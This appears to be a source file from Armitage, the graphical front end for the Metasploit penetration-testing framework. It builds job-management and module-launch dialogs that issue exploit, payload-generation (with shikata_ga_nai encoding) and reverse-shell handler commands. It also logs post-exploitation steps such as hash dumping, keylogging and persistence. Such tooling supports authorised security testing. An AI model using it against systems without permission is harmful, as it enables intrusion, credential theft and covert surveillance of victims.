#
# code to manage some jobs ;)
#

import msf.*;
import armitage.*;
import console.*;
import table.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import java.awt.*;
import java.awt.event.*;

sub manage_proxy_server {
	manage_job("Auxiliary: server/socks4a", 
		# start server function
		{
			launch_dialog("SOCKS Proxy", "auxiliary", "server/socks4a", $null);
		},
		# description of job (for job kill function)
		{
			local('$host $port');
			($host, $port) = values($2["datastore"], @("SRVHOST", "SRVPORT"));
			return "SOCKS proxy is running on $host $+ : $+ $port $+ .\nWould you like to stop it?";
		}
	);

}

sub report_url {
	find_job($name, {
		if ($1 == -1) {
			showError("Server not found");
		}
		else {
			local('$job $host $port $uripath');
			$job = call($client, "job.info", $1);

			($host, $port) = values($job["info"]["datastore"], @("SRVHOST", "SRVPORT"));
			$uripath = $job["info"]["uripath"];

			local('$dialog $text $ok');
			$dialog = dialog("Output", 320, 240);
			$text = [new JTextArea];
			[$text setText: "http:// $+ $host $+ : $+ $port $+ $uripath"];

			$button = [new JButton: "Ok"];
 			[$button addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];

			[$dialog add: [new JScrollPane: $text], [BorderLayout CENTER]];
			[$dialog add: center($button), [BorderLayout SOUTH]];

			[$dialog setVisible: 1];
		}
	});
}

sub find_job {
	#
	# convoluted? yes, but jobs.info kept locking up on some of my requests...
	#
	cmd_safe("jobs", lambda({
		local('$temp $jid $jname $confirm');

		foreach $temp (split("\n", $3)) {
			if ([$temp trim] ismatch '.*?(\d+)\s+(.*?)') {
				($jid, $jname) = matched();	

				if ($jname eq $name) {
					[$function: $jid];
					return;
				}
			}
		}
		[$function: -1];
	}, $name => $1, $function => $2));
}

# manage_job(job name, { start job function }, { job dialog info })
sub manage_job {
	local('$name $startf $stopf');
	($name, $startf, $stopf) = @_;

	find_job($name, lambda({
		if ($1 == -1) {
			[$startf];
		}
		else {
			local('$job $confirm $foo');
			$job = call($client, "job.info", $1);

			$foo = lambda({
				local('$confirm');
				$confirm = askYesNo([$stopf : $jid, $job], "Stop Job");
				if ($confirm eq "0") {
					cmd_safe("jobs -k $jid", {
						if ($3 ne "") { showError($3); }
					});
				}
			}, \$stopf, \$job, $jid => $1);

			if ([SwingUtilities isEventDispatchThread]) {
				[$foo];				
			}
			else {
				[SwingUtilities invokeLater: $foo];
			}
		}		
	}, \$startf, \$stopf));
}

# pass the module launch to another thread please.
sub launch_service {
	local('$file');
	if ($4 eq "payload" && $format ne "multi/handler") {
		$file = iff($REMOTE, ask("Where should I save the file?"), saveFile2());
	}

	thread(lambda({
		local('$title $module $options $type');
		($title, $module, $options, $type) = $args;
		_launch_service($title, $module, $options, $type, \$format, \$file);
	}, $args => @_, \$format, \$file));
}

sub _launch_service {
	local('$c $key $value');

	if ('SESSION' in $3) {
		$c = createConsoleTab("$1", 1, $host => sessionToHost($3['SESSION']), $file => "post");
	}
	else if ('RHOST' in $3) {
		$c = createConsoleTab("$1", 1, $host => $3['RHOST'], $file => $4);
	}
	else {
		$c = createConsoleTab("$1", 1);
	}
	[[$c getWindow] setPrompt: "msf > "];

	if ($4 eq "payload" && $format eq "multi/handler") {
		[$c sendString: "use exploit/multi/handler\n"];	
		[$c sendString: "set PAYLOAD ". substr($2, 8) . "\n"];
		[$c sendString: "set ExitOnSession false\n"];
	}
	else {
		[$c sendString: "use $2\n"];	
	}

	foreach $key => $value ($3) {
		[$c sendString: "set $key $value $+ \n"];		
	}
	
	if ($4 eq "exploit" || ($4 eq "payload" && $format eq "multi/handler")) {
		[$c sendString: "exploit -j\n"];
	}
	else if ($4 eq "payload") {
		if ($file !is $null) {
			$file = strrep($file, '\\', '\\\\'); 

			if ("*windows*meterpreter*" iswm $2) {
				[$c sendString: "generate -e x86/shikata_ga_nai -i 3 -t $format -f \" $+ $file $+ \"\n"];
			}
			else {
				[$c sendString: "generate -t $format -f \" $+ $file $+ \"\n"];
			}

			if ($client !is $mclient) {
				thread(lambda({
					yield 8192;
					downloadFile($file);
					[[$c getWindow] append: "[*] Downloaded \" $+ $file $+ \" to local host\n"];
				}, \$file, \$c));
			}
		}
	}
	else {
		[$c sendString: "run -j\n"];
	}
}

#
# pop up a dialog to start our attack with... fun fun fun
#

# launch_dialog("title", "type", "name", "visible", "hosts...", %options)
sub launch_dialog {
	local('$info $options $6');
	$info = call($client, "module.info", $2, $3);
	$options = call($client, "module.options", $2, $3);

	# give callers the ability to set any options before we pass things on.
	if (-ishash $6) {
		local('$key $value');
		foreach $key => $value ($6) {
			if ($key in $options) {
				$options[$key]["default"] = $value;
				$options[$key]["advanced"] = "0";
			}
		}
	}

	dispatchEvent(lambda({
		invoke(lambda(&_launch_dialog, \$info, \$options), $args);
	}, \$info, \$options, $args => @_));
}

# $1 = model, $2 = exploit, $3 = selected target
sub updatePayloads {
	thread(lambda({
		local('$best');
		$best = best_client_payload($exploit, $target);
		if ($best eq "windows/meterpreter/reverse_tcp") {
			[$model setValueForKey: "PAYLOAD", "Value", $best];
			[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
			[$model setValueForKey: "LPORT", "Value", ""];
			[$model setValueForKey: "DisablePayloadHandler", "Value", "true"];
			[$model setValueForKey: "ExitOnSession", "Value", ""];
		}
		else {
			[$model setValueForKey: "PAYLOAD", "Value", $best];
			[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
			[$model setValueForKey: "LPORT", "Value", randomPort()];
			[$model setValueForKey: "DisablePayloadHandler", "Value", "false"];
			[$model setValueForKey: "ExitOnSession", "Value", "false"];
		}
		[$model fireListeners];
	}, $model => $1, $exploit => $2, $target => $3));
}

sub _launch_dialog {
	local('$dialog $north $center $center $label $textarea $scroll $model $table $default $combo $key $sorter $value $col $button $6 $5');

	$dialog = dialog($1, 520, 360);

	$north = [new JPanel];
	[$north setLayout: [new BorderLayout]];
	
	$label = [new JLabel: $info["name"]];
	[$label setBorder: [BorderFactory createEmptyBorder: 5, 5, 5, 5]];

	[$north add: $label, [BorderLayout NORTH]];

	$textarea = [new JTextArea: [join(" ", split('[\\n\\s]+', $info["description"])) trim]];
	[$textarea setEditable: 0];
	[$textarea setOpaque: 0];
	[$textarea setLineWrap: 1];
	[$textarea setWrapStyleWord: 1];
	[$textarea setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	$scroll = [new JScrollPane: $textarea];
	[$scroll setPreferredSize: [new Dimension: 480, 48]];
	[$scroll setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];

	[$north add: $scroll, [BorderLayout CENTER]];

	$model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
	[$model setCellEditable: 1];
	foreach $key => $value ($options) {	
		if ($key eq "THREADS") {
			$default = "24";
		}
		else if ($key eq "LHOST") {
			$default = $MY_ADDRESS;
		}
		else if ($key eq "RHOSTS") {
			$default = join(", ", $5);
		}
		else if ($key eq "SESSION" && size($5) > 0) {
			local('$host @sessions');

			foreach $host ($5) {
				if ($host in %hosts && 'sessions' in %hosts[$host] && size(%hosts[$host]['sessions']) > 0) {
					push(@sessions, keys(%hosts[$host]['sessions'])[0]);
				}
			}
			$default = join(", ", @sessions);
		}
		else if ($key eq "RHOST" && size($5) > 0) {
			$default = $5[0];
		}
		else {
			$default = $value["default"];
		}

		if ($2 ne "exploit" || $key !in @("DisablePayloadHandler", "PAYLOAD", "LHOST", "LPORT", "ExitOnSession")) {
			[$model _addEntry: %(Option => $key, Value => $default, Tooltip => $value["desc"], Hide => iff($value["advanced"] eq '0' && $value["evasion"] eq '0', '0', '1'))]; 
		}
	}

	#
	# give user the option to configure the client-side payload... of course we'll configure it for them
	# by default :P~
	#
	if ($2 eq "exploit") {
		[$model _addEntry: %(Option => "PAYLOAD", Value => "", Tooltip => "The payload to execute on successful exploitation", Hide => "0")]; 
		[$model _addEntry: %(Option => "DisablePayloadHandler", Value => "1", Tooltip => "Disable the handler code for the selected payload", Hide => "0")]; 
		[$model _addEntry: %(Option => "ExitOnSession", Value => "", Tooltip => "Close this handler after a session")];
		[$model _addEntry: %(Option => "LHOST", Value => "$MY_ADDRESS", Tooltip => "The listen address", Hide => "0")]; 
		[$model _addEntry: %(Option => "LPORT", Value => "", Tooltip => "The listen port", Hide => "0")]; 
	}

	$table = [new JTable: $model];
	$sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$table setRowSorter: $sorter];

	local('%actions');
	%actions["PAYLOAD"] = lambda({
		local('$compatible $payload $check');

		$payload = { 
			return %(payload => $1, Name => $2, Target => $3, Channel => $4);
		};

		$check = [new JCheckBox: "Start a handler for this payload"];

		$compatible = @();
		push($compatible, [$payload: "windows/meterpreter/reverse_tcp", "Meterpreter", "Windows", "TCP/IP"]);
		push($compatible, [$payload: "windows/meterpreter/reverse_tcp_dns", "Meterpreter", "Windows", "TCP/IP to hostname"]);
		push($compatible, [$payload: "windows/meterpreter/reverse_ipv6_tcp", "Meterpreter", "Windows", "TCP/IPv6"]);
		push($compatible, [$payload: "windows/meterpreter/reverse_http", "Meterpreter", "Windows", "HTTP"]);
		push($compatible, [$payload: "windows/meterpreter/reverse_https", "Meterpreter", "Windows", "HTTPS"]);
		push($compatible, [$payload: "java/meterpreter/reverse_tcp", "Meterpreter", "Java", "TCP/IP"]);
		push($compatible, [$payload: "java/meterpreter/reverse_http", "Meterpreter", "Java", "HTTP"]);
		push($compatible, [$payload: "linux/meterpreter/reverse_tcp", "Meterpreter", "Linux", "TCP/IP"]);
		push($compatible, [$payload: "linux/meterpreter/reverse_ipv6_tcp", "Meterpreter", "Linux", "TCP/IPv6"]);
		push($compatible, [$payload: "osx/ppc/shell/reverse_tcp", "Shell", "MacOS X (PPC)", "TCP/IP"]);
		push($compatible, [$payload: "osx/x86/vforkshell/reverse_tcp", "Shell", "MacOS X (x86)", "TCP/IP"]);
		push($compatible, [$payload: "generic/shell_reverse_tcp", "Shell", "UNIX (Generic)", "TCP/IP"]);
	
		quickListDialog("Choose a payload", "Select", @("payload", "Name", "Target", "Channel"), $compatible, $width => 640, $height => 240, $after => @(left($check)), lambda({
			# set the payload...
			if ($1 eq "") {
				return;
			}

			if ([$check isSelected]) {
				[$model setValueForKey: "DisablePayloadHandler", "Value", "false"];
				[$model setValueForKey: "HANDLER", "Value", "true"];
				[$model setValueForKey: "ExitOnSession", "Value", "false"];
				[$model setValueForKey: "LPORT", "Value", randomPort()];
			}
			else {
				[$model setValueForKey: "DisablePayloadHandler", "Value", "true"];
				[$model setValueForKey: "HANDLER", "Value", "false"];
				[$model setValueForKey: "ExitOnSession", "Value", ""];
				[$model setValueForKey: "LPORT", "Value", ""];
			}

			if ($1 eq "windows/meterpreter/reverse_tcp" || $1 eq "windows/meterpreter/reverse_tcp_dns") {
				[$model setValueForKey: "PAYLOAD", "Value", $1];
				[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
			}
			else if ($1 eq "windows/meterpreter/reverse_http" || $1 eq "windows/meterpreter/reverse_https" || $1 eq "java/meterpreter/reverse_http") {
				[$model setValueForKey: "PAYLOAD", "Value", $1];
				[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
				[$model setValueForKey: "LPORT", "Value", iff([$1 endsWith: "http"], "80", "443")];
			}
			else {
				[$model setValueForKey: "PAYLOAD", "Value", $1];
			}
			[$model fireListeners];
		}, $callback => $4, \$model, \$check));
	}, $exploit => $3, \$model);

	addFileListener($table, $model, %actions);

	local('$TABLE_RENDERER');
	$TABLE_RENDERER = tableRenderer($table, $model);

	foreach $col (@("Option", "Value")) {
		[[$table getColumn: $col] setCellRenderer: $TABLE_RENDERER];
	}

	$center = [new JScrollPane: $table];
	$combo = select(sorta(split(',', "raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vbs,loop-vbs,asp,war,multi/handler")), "multi/handler");
	$button = [new JButton: "Launch"];

	local('$combobox');
	if ('targets' in $info) {
		$combobox = targetsCombobox($info);
		[$combobox addActionListener: lambda({
			updatePayloads($model, $exploit, [$combobox getSelectedItem]);
		}, \$model, $exploit => $3, \$combobox)];
	}

	[$button addActionListener: lambda({
		local('$options $host $x $best');
		syncTable($table);

		$options = %();

		# assume we have an exploit... set the appropriate target please...
		if ($combobox !is $null) {
			$options["TARGET"] = split(' \=\> ', [$combobox getSelectedItem])[0];
		}

		for ($x = 0; $x < [$model getRowCount]; $x++) {
			if ([$model getValueAt: $x, 1] ne "") { 
				$options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
			}
		}

		[$dialog setVisible: 0];

		if ($visible) {
			if ('SESSION' in $options) {
				local('@sessions $session $console');
				@sessions = split(',\s+', $options['SESSION']);
				foreach $session (@sessions) {
					$options['SESSION'] = $session;
					launch_service($title, "$type $+ / $+ $command", copy($options), $type, $format => [$combo getSelectedItem]);
				}

				if ($command eq "windows/gather/smart_hashdump" || $command eq "windows/gather/hashdump") {
					foreach $session (@sessions) {
						$session = sessionToHost($session);
					}
		                        elog("dumped hashes on " . join(", ", @sessions));
				}
				else if ($command eq "windows/capture/keylog_recorder") {
					foreach $session (@sessions) {
						$session = sessionToHost($session);
					}
		                        elog("is logging keystrokes on " . join(", ", @sessions));
				}
				else if ($command eq "windows/manage/persistence") {
					foreach $session (@sessions) {
						$session = sessionToHost($session);
					}
		                        elog("ran persistence on " . join(", ", @sessions));
				}
			}
			else {
				launch_service($title, "$type $+ / $+ $command", $options, $type, $format => [$combo getSelectedItem]);
			}
		}
		else {
			thread(lambda({
				local('$r');
				$r = call($client, "module.execute", $type, $command, $options);
				if ("result" in $r) {
					showError($r["result"]);
				}
				else if ("job_id" in $r) {
					showError("Started service");
				}
				else {
					showError($r);
				}
			}, \$type, \$command, \$options));
		}
	}, \$dialog, \$model, $title => $1, $type => $2, $command => $3, $visible => $4, \$combo, \$table, \$combobox)];

	local('$advanced');
	$advanced = addAdvanced(\$model);

	local('$panel');
	$panel = [new JPanel];
	[$panel setLayout: [new BoxLayout: $panel, [BoxLayout Y_AXIS]]];

	if ($2 eq "payload") {
		[$panel add: left([new JLabel: "Output: "], $combo)];
	}
	else if ($combobox !is $null) {
		[$panel add: left([new JLabel: "Targets: "], $combobox)];
	}

	if ($2 eq "exploit") {
		updatePayloads($model, "$3", iff($combobox !is $null, [$combobox getSelectedItem]));
	}

	[$panel add: left($advanced)];
	[$panel add: center($button)];
	[$dialog add: $panel, [BorderLayout SOUTH]];

	[$dialog add: $north, [BorderLayout NORTH]];
	[$dialog add: $center, [BorderLayout CENTER]];

	[$button requestFocus];

	[$dialog setVisible: 1];
}

sub updateJobsTable {
	[$model clear: 8];

	local('$jobs $jid $desc $info $data');
	$jobs = call($client, "job.list");
	foreach $jid => $desc ($jobs) {
		$info = call($client, "job.info", $jid);
		$data = $info["datastore"];
		if (!-ishash $data) { $data = %(); }

		[$model addEntry: %(Id => $jid, Name => $info['name'], Payload => $data['PAYLOAD'], Port => $data['LPORT'], Start => rtime($info['start_time']), URL => $info['uripath'])];
	}

	[$model fireListeners];
}

sub createJobsTab {	
	local('$table $model $refresh $kill $panel $jobsf $sorter');
	
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	$model = [new GenericTableModel: @("Id", "Name", "Payload", "Port", "URL", "Start"), "Id", 8];

	$table = [new JTable: $model];
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
	[[$table getColumn: "Id"] setPreferredWidth: 125];
	[[$table getColumn: "Port"] setPreferredWidth: 200];
	[[$table getColumn: "Name"] setPreferredWidth: 1024];
	[[$table getColumn: "Payload"] setPreferredWidth: 1024];
	[[$table getColumn: "URL"] setPreferredWidth: 1024];
	[[$table getColumn: "Start"] setPreferredWidth: 1024];

        $sorter = [new TableRowSorter: $model];
        [$sorter toggleSortOrder: 0];
        [$table setRowSorter: $sorter];
        [$sorter setComparator: 0, { return $1 <=> $2; }];
        [$sorter setComparator: 3, { return $1 <=> $2; }];

	$jobsf = lambda(&updateJobsTable, \$model);
	[$jobsf];

	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
	
	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({ thread($jobsf); }, \$jobsf)];

	$kill = [new JButton: "Kill"];
	[$kill addActionListener: lambda({
		cmd_safe("jobs -k " . [$model getSelectedValue: $table], lambda({ 
			showError($3); 
			[$jobsf];
		}, \$jobsf));
	}, \$table, \$model, \$jobsf)];

	[$panel add: center($refresh, $kill), [BorderLayout SOUTH]];

	[$frame addTab: "Jobs", $panel, $null];
}		
